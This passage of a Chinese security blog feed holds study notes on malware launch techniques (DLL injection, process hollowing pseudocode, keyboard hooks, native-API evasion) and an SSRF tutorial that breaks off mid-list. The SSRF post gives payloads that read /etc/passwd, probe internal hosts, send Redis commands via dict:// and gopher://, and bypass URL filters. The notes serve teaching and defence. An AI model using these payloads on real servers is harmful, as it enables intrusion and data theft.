    <content type="html"><![CDATA[<p>恶意代码的编写者开发了多种技术，来实现隐蔽的恶意代码启动。</p><span id="more"></span><h2 id="启动器-Launcher"><a href="#启动器-Launcher" class="headerlink" title="启动器(Launcher)"></a>启动器(Launcher)</h2><ul><li>定义：也称为加载器，用来启动其他恶意程序的恶意代码。通常情况下，启动器使用一些非传统的技术，来启动其他恶意程序。</li><li>目的：使恶意行为对用户隐藏；可能包含<strong>提权</strong>代码，以更高权限访问系统。</li><li>启动器经常包含它要加载的恶意代码。最常见的情况是在它的资源节中包含一个可执行文件或DLL。</li><li>常用资源操作API函数： <code>FindResource </code>，<code>LoadResource</code> ，<code> SizeofResource</code> 。</li></ul><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><ul><li><p>定义：这种技术是将代码注入到<strong>另外一个正在运行</strong>的进程中，而被注入的进程会不知不觉地运行注入的代码。</p></li><li><p>常用函数：</p><p>VirtualAllocEx：在指定进程中分配一块内存空间。</p><p>WriteProcessMemory：此函数能向VirtualAllocEx函数分配的地址空间写数据。</p></li></ul><p>在实现过程中，需要先获取目标进程的ID。**OpenProcess( )**这个API实现打开进程（返回进程的句柄）。</p><h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p><strong>定义</strong>：</p><ul><li>DLL注入是进程注入的一种形式，它强迫一个远程进程加载恶意DLL程序，同时它是最常用的秘密加载技术。</li><li>所谓DLL注入就是将一个DLL放进某个进程的地址空间里，让它成为那个进程的一部分。</li></ul><p><strong>基本思路</strong>：</p><p>调用 <strong>CreateRemoteThread</strong> ( 三个重要参数：进程句柄、注入线程入口点、线程参数)时，线程入口点设置为LoadLibrary函数的地址，并且恶意DLL名字作为它的参数。</p><p><img src="https://s2.loli.net/2023/12/04/mKHxbGeXOq37k1W.png" alt="image-20231204085749284"></p><p><strong>实现过程：</strong></p><ul><li>FindWindow( )、GetWindowThreadProcessId( )&#x2F; CreateToolhelp32Snapshot( )，Process32First( )和Process32Next( )这两组函数就是为了获得目标进程的ID，**OpenProcess( )**这个API实现打开进程。</li><li>VirtualAllocEx( )向“宿主进程”申请内存。</li><li>WriteProcessMemory( )把特定的数据（恶意DLL模块或恶意代码）写进“目标进程”。 </li><li>GetProcAddress( )检索指定的动态链接库(DLL)中的输出库函数（LoadLibrary）地址。</li><li>LoadLibrary( )是加载DLL文件的必备API。</li><li>CreateRemoteThread( )或者NtCreateThreadEx ( )或RtlCreateUserThread ( ) ，这个API强制在宿主进程里面新建一个线程。</li><li>WaitForSingleObject( )、VirtualFreeEx( )、CloseHandle( )等待与清理。</li></ul><p><img src="https://s2.loli.net/2023/12/04/4cBzg3HdPprayLe.png" alt="image-20231204090132584"></p><p>参考教程：<a href="https://www.cnblogs.com/Xy--1/p/14506866.html">DLL进程注入之CreateRemoteThread() - Lushun - 博客园 (cnblogs.com)</a></p><h3 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h3><p><strong>相同点：</strong></p><p>同DLL注入一样，在远程进程的内存空间中分配和插入代码，使用类似的Windows函数。</p><p><strong>不同点：</strong></p><p>不单独编写DLL，直接将恶意代码注入到远程进程中，比DLL注入更加灵活。</p><p><strong>特点：</strong></p><ul><li>需要大量的定制代码。</li><li>通常用来注入shellcode。</li><li>两次VirtualAllocEx()和WriteProcessMemory()：第一次分配内容空间并写入数据；第二次分配内存空间并写入代码。</li><li>要求精通汇编语言，或编写简单的shellcode。</li></ul><p>参考教程：<a href="https://xz.aliyun.com/t/11933">进程注入：通过远程线程注入代码 - 先知社区 (aliyun.com)</a></p><h2 id="进程替换"><a href="#进程替换" class="headerlink" title="进程替换"></a>进程替换</h2><p><strong>定义：</strong></p><p>进程替换是指将正在运行的程序的内存空间用恶意代码替换掉。如果被替换的进程是合法的进程, 那么恶</p><p>意代码可以披着合法的外衣干坏事。</p><p><strong>关键点：</strong></p><p>以挂起状态创建一个进程。 CreateProcess以CREATE_SUSPENDED方式调用。</p><p><strong>进程替换过程：</strong></p><ul><li>创建一个挂起状态的进程, 此时进程的主线程还未开始运行；</li><li>读取主线程的上下文, 并读取新创建进程的基址；</li><li>使用ZwUnmapViewOfSection&#x2F;NtUnmapViewOfSection将新创建的进程的内存空间释放掉, 随后可以开始填充恶意代码；</li><li>用VirtualAllocEx在子进程指定的基址分配空间，调用ReadProcessMemoryWriteProcessMemory来读写子进程空间的内容，调用VirtualProtectEx修改内存的属性为可读可写可执行；</li><li>设置主线程的上下文, 启动主线程。</li></ul><p><strong>伪代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">CreateProcess(cAppName, ....., CREATE_SUSPENDED, .....);<span class="hljs-comment">//创建挂起进程</span><br><br>ZwUnmapViewOfSection（....）; <span class="hljs-comment">//释放内存</span><br><br>VirtualAllocEx(...,ImageBase,SizeOfImge....); <span class="hljs-comment">//为恶意代码分配新的内存</span><br><br>WriteProcessMemory（...headers,...）; <span class="hljs-comment">//将恶意代码每个段写入进程空间</span><br><br><span class="hljs-keyword">for</span> &#123;WriteProcessMemory ();&#125;<br><br>SetThreadContext(); <span class="hljs-comment">//入口点指向恶意代码</span><br><br>....<br><br>ResumeThread(); <span class="hljs-comment">//执行</span><br></code></pre></td></tr></table></figure><h2 id="钩子-Hook-注入"><a href="#钩子-Hook-注入" class="headerlink" title="钩子(Hook)注入"></a>钩子(Hook)注入</h2><p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。钩子机制允许应用程序截获处理Window消息或特定事件。</p><p>钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p><p>没有使用钩子注入和使用钩子注入的Windows事件和消息流：</p><img src="https://s2.loli.net/2023/12/04/ivHNmlhocYGOgMR.png" alt="image-20231204091626450" style="zoom:67%;" /><h3 id="钩子的分类"><a href="#钩子的分类" class="headerlink" title="钩子的分类"></a>钩子的分类</h3><p><strong>按使用范围分类：</strong></p><ul><li><p>系统钩子（全局钩子）</p><ul><li>监视系统中的所有线程的事件消息。</li><li>会影响系统中所有应用程序，钩子函数必须放在<strong>独立的DLL</strong>中。</li><li>系统自动将包含“钩子回调函数”的DLL映射到受钩子函数影响的所有进程的地址空间中，即将这个DLL注入到那些进程。</li></ul></li><li><p>线程钩子（局部钩子）</p><ul><li>用于监视指定线程的事件消息。</li><li>一般在当前线程或者当前线程派生的线程内。</li></ul></li></ul><p><strong>按事件分类：</strong></p><ul><li>键盘钩子和低级键盘钩子可以监视各种键盘消息。</li><li>鼠标钩子和低级鼠标钩子可以监视各种鼠标消息。</li><li>shell钩子可以监视各种Shell事件消息。比如：启动和关闭应用程序。</li><li>日志钩子可以记录从系统消息队列中取出的各种事件消息。</li><li>窗口过程钩子监视所有从系统消息队列发往目标窗口的消息。</li><li>还有一些特定事件的钩子。</li></ul><h3 id="系统钩子和线程钩子"><a href="#系统钩子和线程钩子" class="headerlink" title="系统钩子和线程钩子"></a>系统钩子和线程钩子</h3><ul><li>SetWindowsHookEx()函数的<strong>最后一个参数，决定此钩子是系统钩子还是线程钩子。</strong></li><li>如果对同一事件（如鼠标消息）既安装线程钩子又安装系统钩子，那么系统会自动先调用线程钩子，然后调用系统钩子。</li><li>对同一事件消息可安装多个钩子处理过程，这些钩子处理过程形成钩子链。当前钩子处理结束后，应把钩子信息传递给下一个钩子函数。</li><li>钩子特别是系统钩子会消耗消息处理时间，降低系统性能。只有在必要的时候才安装钩子，在使用完毕后要及时卸载。</li></ul><h3 id="使用钩子的键盘记录器"><a href="#使用钩子的键盘记录器" class="headerlink" title="使用钩子的键盘记录器"></a>使用钩子的键盘记录器</h3><img src="https://s2.loli.net/2023/12/04/lu7PxUp6m2cVzO3.png" alt="image-20231204092837469" style="zoom:50%;" /><h3 id="使用SetWindowsHookEx"><a href="#使用SetWindowsHookEx" class="headerlink" title="使用SetWindowsHookEx"></a>使用SetWindowsHookEx</h3><p><strong>功能：</strong>该函数将一个应用程序定义的挂钩处理过程<strong>安装到挂钩链</strong>中，可以通过安装挂钩处理过程来对系统的某些类型事件进行监控，这些事件与某个特定的线程或系统中的所有事件相关。</p><p><strong>函数原型：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">__in <span class="hljs-type">int</span> idHook, \\钩子类型</span><br><span class="hljs-params"></span><br><span class="hljs-params">__in HOOKPROC lpfn, \\回调函数地址</span><br><span class="hljs-params"></span><br><span class="hljs-params">__in HINSTANCE hMod, \\实例句柄</span><br><span class="hljs-params"></span><br><span class="hljs-params">__in DWORD dwThreadId \\线程ID</span><br><span class="hljs-params"></span><br><span class="hljs-params">)</span>;<br><br>LRESULT WINAPI <span class="hljs-title function_">CallNextHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">_In_opt_ HHOOK hhk， \\ 保存的钩子过程,也就是SetWindowsHookEx返回值.</span><br><span class="hljs-params"></span><br><span class="hljs-params">_In_ <span class="hljs-type">int</span> nCode， \\ 根据SetWindowsHookEx设置的钩子回调而产生的不同的nCode代码.</span><br><span class="hljs-params"></span><br><span class="hljs-params">\\如果设置的钩子类型是鼠标消息.那么那个nCode就是鼠标消息.如果是键盘这是键盘</span><br><span class="hljs-params"></span><br><span class="hljs-params">_In_ WPARAM wParam， \\ 同<span class="hljs-number">2</span>参数一样.附加参数. 根据钩子回调类型.附加参</span><br><span class="hljs-params"></span><br><span class="hljs-params">数有不同的意义.</span><br><span class="hljs-params"></span><br><span class="hljs-params">_In_ LPARAM lParam \\ 同<span class="hljs-number">3</span>参数一样.附加参数.</span><br><span class="hljs-params"></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p><strong>参数</strong>：<br>idHook：指示欲被安装的挂钩处理过程的类型。（14种）<br>lpfn：指向相应的<strong>挂钩处理过程</strong>。若参数dwThreadId为0或者指示一个其他进程创建的线程的标识符，则参数lpfn必须指向一个DLL中的挂钩处理过程。否则，参数lpfn可以指向一个与当前进程相关的代码中定义的挂钩处理过程。<br>hMod：指示一个DLL的句柄，该DLL包含参数lpfn所指向的挂钩处理过程。若参数dwThreadId指示的线程由当前进程创建，并且相应的挂钩处理过程定义于当前进程相关的代码中，则参数hMod必须被设置为NULL(0)。<br><strong>dwThreadId：指示一个线程标识符，挂钩处理过程与线程相关（线程钩子）。若此参数值为0，则该挂钩处理过程与所有现存的线程相关。（系统钩子）</strong></p><p><strong>钩子的示例</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK keyboardHook, hhook;<br>LRESULT CALLBACK <span class="hljs-title function_">KeyboardProc</span><span class="hljs-params">( _In_int code,  _In_WPARAM wParam,  _In_LPARAM lParam)</span><br>&#123;<br>       ::MessageBox(<span class="hljs-literal">NULL</span>, “按键了”, “caption”, <span class="hljs-number">0x00000002</span>L);<br>       <span class="hljs-keyword">return</span> CallNextHookEx(keyboardHook, code, wParam, lParam);    <span class="hljs-comment">//第一个参数一般可以为NULL</span><br>&#125;<br><br> <span class="hljs-comment">//在对应线程设置键盘钩子</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setHook</span><span class="hljs-params">(DWORD threadId)</span><span class="hljs-comment">//需要Hook的线程ID</span><br>&#123;<br>          <span class="hljs-comment">//Hook其他进程中的线程，设置KeyboardProc回调函数，该函数在“mydll.dll”中实现</span><br>          keyboardHook=SetWindowsHookEx(WH_KEYBOARDPROC, KeyboardProc, GetModuleHandle(“mydll.dll”), threadId);<br>         <span class="hljs-comment">//Hook自身进程中的线程</span><br>          hhook =SetWindowsHookEx(WH_KEYBOARDPROC, KeyboardProc, <span class="hljs-literal">NULL</span>, threadId);<br>&#125;<br></code></pre></td></tr></table></figure><p>参考链接：<a href="https://cloud.tencent.com/developer/article/1199648">https://cloud.tencent.com/developer/article/1199648</a></p><h2 id="Detours"><a href="#Detours" class="headerlink" title="Detours"></a>Detours</h2><ul><li>Detours是一个在x86、x64、IA64和ARM64平台上截获任意API函数调用的工具库。</li><li>Detours使用一个无条件转移指令来替换目标函数的最初几条指令，将控制流转移到一个用户提供的截获函数。</li><li>目标函数中的一些指令被保存在一个被称为“trampoline”的函数中。</li><li>这些指令包括目标函数中被替换的代码，以及一个重新跳转到目标函数的无条件分支。而截获函数可以替换目标函数，或者通过执行“trampoline”函数的时候，将目标函数作为子程序来调用的办法来扩展功能。</li></ul>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>恶意windows程序</title>
    <link href="/2024/02/04/%E6%81%B6%E6%84%8Fwindows%E7%A8%8B%E5%BA%8F/"/>
    <url>/2024/02/04/%E6%81%B6%E6%84%8Fwindows%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="恶意windows程序"><a href="#恶意windows程序" class="headerlink" title="恶意windows程序"></a>恶意windows程序</h1><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><h3 id="Windows-API-1"><a href="#Windows-API-1" class="headerlink" title="Windows API"></a>Windows API</h3><ul><li>一个广泛的功能集合<br>管理（恶意）代码与微软程序库之间的交互方式<br>功能强大</li></ul><span id="more"></span><h3 id="类型与匈牙利表示法"><a href="#类型与匈牙利表示法" class="headerlink" title="类型与匈牙利表示法"></a>类型与匈牙利表示法</h3><ul><li>多数Windows API使用自己的名字来表示C语言类型，标准C如int通常不使用</li><li>Windows总体使用匈牙利表示法作为API函数标识符</li><li>表达式使用一个前缀命名模式，来识别一个变量的类型</li><li>一个32位无符号整数的变量，或DWORD，会以dw开头</li></ul><h3 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h3><ul><li>在操作系统中被打开或被创建的项</li><li>窗口、进程、模块、菜单、文件、管道、端口、互斥量等</li><li>有点像引用对象或其他某个内存位置的指针，但不能进行数学操作，也不总是表示对象地址；后续可以使用它来引用同一对象</li></ul><h3 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h3><ul><li>CreateFile和OpenFile（文件、管道、流，以及I&#x2F;O设备）</li><li>ReadFile和WriteFile（对文件的读和写，都将文件作为流来操作）</li><li>CreateFileMapping和MapViewofFile（文件映射）</li></ul><p>前者从磁盘加载文件到内存，后者返回一个指向映射的基地址的指针。可用来访问内存中的文件。</p><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><ul><li>访问方式与普通文件不一样：不能通过盘符与文件夹进行访问；</li><li>有些比普通文件更隐蔽：在列目录时不会显示出来；</li><li>可以提供对系统硬件和内部数据更强的访问能力；</li><li>可以作为字符串参数被传递给任何文件操作函数，并像普通文件一样进行操作。</li></ul><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><ul><li>根键：一共有 5 个顶层根键节点，每一个根键有一个特定的目的。</li><li>子键：一个子键就像一个文件夹中的子文件夹。</li><li>键值项：可以理解为文件。名称、类型、数据。</li></ul><h3 id="注册表根键"><a href="#注册表根键" class="headerlink" title="注册表根键"></a>注册表根键</h3><table><thead><tr><th><strong>注册表根键</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>HKEY_LOCAL_MACHINE(HKLM)</strong></td><td><strong>保存对本地机器全局设置；</strong></td></tr><tr><td><strong>HKEY_CURRENT_USER(HKCU)</strong></td><td><strong>保存当前用户特定的设置；</strong></td></tr><tr><td><strong>HKEY_CLASSES_ROOT</strong></td><td><strong>保存定义的类型信息；</strong></td></tr><tr><td><strong>HKEY_CURRENT_CONTIG</strong></td><td><strong>保存关于当前硬件配置的设置，特别是与当前和标准配置直接不同的部分；</strong></td></tr><tr><td><strong>HKEY_USERS</strong></td><td><strong>定义默认用户、新用户和当前用户的配置；</strong></td></tr></tbody></table><h3 id="常用注册表函数"><a href="#常用注册表函数" class="headerlink" title="常用注册表函数"></a>常用注册表函数</h3><p>RegOpenKeyEx 打开一个注册表键进行编辑和查询<br>RegSetValueEx 添加一个新值，并设置数值<br>RegGetValue 返回注册表中一个键值</p><p><strong>参考链接</strong><br><a href="https://www.cnblogs.com/john-h/p/5886870.html">https://www.cnblogs.com/john-h/p/5886870.html</a><br><a href="https://www.cnblogs.com/kzloser/archive/2012/11/07/2758404.html">https://www.cnblogs.com/kzloser/archive/2012/11/07/2758404.html</a></p><p><strong>使用.reg文件的注册表脚本</strong><br>用.reg作为扩展的文件包含一个可读的注册表数据<br>双击运行后，会自动地通过合并文件包含的信息到注册表中</p><h2 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h2><p><img src="/../img/WaskvQ6wDoymVPb.png" alt="image-20231120145550150"></p><h3 id="WinINet-API"><a href="#WinINet-API" class="headerlink" title="WinINet API"></a>WinINet API</h3><ul><li>保存在Wininet.dll中;</li><li>比Windows API更高一级，实现了应用层协议，如HTTP和FTP;</li><li>可以用来连接远程服务器，并获取指令。</li><li>InternetOpen被用来初始化一个到互联网的连接。</li><li>InternetOpenUrl被用来访问一个URL(它可以是一个HTTP页面或一个FTP资源）。</li><li>InternetReadFile和ReadFile函数工作原理相似，允许程序从一个来自互联网的下载文件中读取数据。</li></ul><h2 id="跟踪恶意代码的运行"><a href="#跟踪恶意代码的运行" class="headerlink" title="跟踪恶意代码的运行"></a>跟踪恶意代码的运行</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><ul><li>保存恶意代码（保存为DLL比EXE更有利，可以附加到其他进程）；</li><li>使用Windows DLL；</li><li>使用第三方DLL（借其他程度的DLL文件来完成恶意代码自己的功能）</li></ul><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul><li>恶意代码可以通过创建一个新进程，或修改一个已经存在的进程，来执行当前程序之外的代码。目前的恶意代码普遍<strong>将自身代码作为其他进程的一部分</strong>执行。</li><li>创建一个新的进程使用CreateProcess函数，让进程（恶意代码）共享系统内存。</li></ul><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>执行附加代码的另一种方式是将它作为服务安装</p><ul><li><p>Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；</p></li><li><p>代码被Windows服务管理调度和运行，不需要用户输入；</p></li><li><p>服务通常作为<strong>SYSTEM或其他特权账户</strong>运行；</p><p>（需要一个管理员权限才能安装一个服务）</p></li><li><p>能够当操作系统启动时自动运行，在系统上持久化驻留；</p></li><li><p>在任务管理器中<strong>不作为一个进程显示</strong>出来。</p></li></ul><p>通过Windows API 来安装和操作服务</p><ul><li>OpenSCManager 返回一个服务控制管理器<strong>句柄</strong>，用来进行后续与服务相关的函数调用。</li><li>CreateService 添加一个新服务到服务控制管理器，并且允许调用者制定服务是否在引导时自动启动，或者必须手动启动。</li><li>StartService 启动一个服务，并且仅在服务被设置成手动启动时使用。</li></ul><p>服务类型：</p><ul><li>WIN32_SHARE_PROCESS类型<br>以<strong>DLL</strong>形式，并且在一个共享的进程中组合多个不同的服务。</li><li>WIN32_OWN_PROCESS类型<br>以EXE形式，作为一个独立进程运行。</li><li>KERNEL_DRIVER<br>以SYS形式，被用来加载代码到内核中执行。</li></ul><h3 id="组件对象模型COM"><a href="#组件对象模型COM" class="headerlink" title="组件对象模型COM"></a>组件对象模型COM</h3><p>COM是什么：</p><ul><li>一个接口标准<br>使不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</li><li>分析使用COM的恶意代码<br>要能够判断哪段代码会被作为一个COM函数进行调用运行。</li><li>支持任何编程语言<br>被设计成一种可复用的软件组件，并可以被所有程序利用。</li></ul><p>COM被实现成C&#x2F;S框架：<br>客户端是使用COM对象的程序；<br>服务器是可复用的组件，就是COM对象本身。</p><h2 id="内核模式、用户模式和原生API"><a href="#内核模式、用户模式和原生API" class="headerlink" title="内核模式、用户模式和原生API"></a>内核模式、用户模式和原生API</h2><h3 id="内核与用户模式"><a href="#内核与用户模式" class="headerlink" title="内核与用户模式"></a>内核与用户模式</h3><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于Windows API。</p><h3 id="原生API"><a href="#原生API" class="headerlink" title="原生API"></a>原生API</h3><p><img src="https://s2.loli.net/2023/11/20/FGxRtw7n84gEfvS.png" alt="image-20231120151956422"></p><p>原生API是用来和Windows进行交互的底层API，它们很少被非恶意程序使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通的Windows API。</p><p>当调用Windows API中的一个函数时,这个函数通常<strong>不会直接执行请求的动作</strong>，因为大多数重要数据结构都被保存在内核中，在内核外面的代码（用户模式代码) 是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。上图说明了对于大多数API调用来说，这是如何工作的。</p><p>用户应用程序被给予对<strong>用户API</strong>(比如kernel32.dll和其他DLL)的访问，这些DLL会调用<strong>ntdll.dll</strong>，这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式,</p><p>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了<strong>原生API</strong>。</p><p><strong>绕过检测</strong>：直接使用ntdll中的函数。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/02/04/ssrf/"/>
    <url>/2024/02/04/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><span id="more"></span><p>（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h3 id="可能场景-漏洞点挖掘"><a href="#可能场景-漏洞点挖掘" class="headerlink" title="可能场景-漏洞点挖掘"></a>可能场景-漏洞点挖掘</h3><ol><li><p>分享：通过URL地址分享网页内容</p><p>获取超链接的标题等内容进行显示</p></li><li><p>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p></li><li><p>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p></li><li><p>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于图片加载。</p></li><li><p>图片加载与下载:通过URL地址加载或下载图片。</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><p>简单来说：<strong>所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</strong>。</p><h3 id="产生SSRF漏洞的函数"><a href="#产生SSRF漏洞的函数" class="headerlink" title="产生SSRF漏洞的函数"></a>产生SSRF漏洞的函数</h3><p>php中有例如以下函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>()<br><span class="hljs-title function_ invoke__">fsockopen</span>()<br><span class="hljs-title function_ invoke__">curl_exec</span>()<br><span class="hljs-title function_ invoke__">fopen</span>()<br><span class="hljs-title function_ invoke__">readfile</span>()<br><br><span class="hljs-comment">//curl_exec() 默认不跟踪跳转</span><br><span class="hljs-comment">//file_get_contents支持php://input协议</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容（访问本地文件系统），如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; dict协议一般常用来探测<strong>内网主机以及端口开放</strong>情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p><p><img src="/../img/1937992-20200527101703916-1706063347.png" alt="img"></p><p><strong>file</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/01/20/sWouUSLvE9qCxhy.png" alt="image-20240120202626265"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php<br></code></pre></td></tr></table></figure><p><strong>dict</strong></p><p>1、探测内网主机</p><p>2、探测端口的开放情况和指纹信息</p><p>3、执行命令 dict:&#x2F;&#x2F;serverip:port&#x2F;命令:参数 （每次只能执行一条命令）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dict:<span class="hljs-regexp">//</span><span class="hljs-number">172.18</span>.<span class="hljs-number">240.5</span>:<span class="hljs-number">80</span>/<br></code></pre></td></tr></table></figure><p>dict协议直接攻击未授权 <strong>Redis</strong> 服务（即无密码，有密码的话无法实现，因为每次执行命令还需要先认证）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://x.x.x.x:6379/&lt;Redis 命令&gt;<br></code></pre></td></tr></table></figure><p><strong>gopher</strong></p><p>gopher支持发出get，post请求（万能协议）</p><p>gopher协议在ssrf的利用中一般用来攻击redis，mysql，fastcgi，smtp等服务。</p><p>gopher协议数据格式：</p><p>gopher:&#x2F;&#x2F;ip:port&#x2F;_{TCP&#x2F;IP数据流}</p><p>注意：</p><p>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行<br>数据流末尾使用%0d%0a代表消息结束</p><p>gopher协议是个tcp&#x2F;ip协议，通过gopher协议可以发送tcp stream，payload使用%+16进制编码，（原理比较简单，可以用tcpdump或者wireshark把stream一段段复制出来）</p><h2 id="漏洞bypass"><a href="#漏洞bypass" class="headerlink" title="漏洞bypass"></a>漏洞bypass</h2><p>在通常情况下，对SSRF的防御措施是对URL特征参数进行检测和过滤、设置可访问URL白名单或使用户无法控制URL的参数，一但过滤的措施不够严密，就会存在多种Bypass方式。</p><ol><li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p></li><li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p></li><li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a>      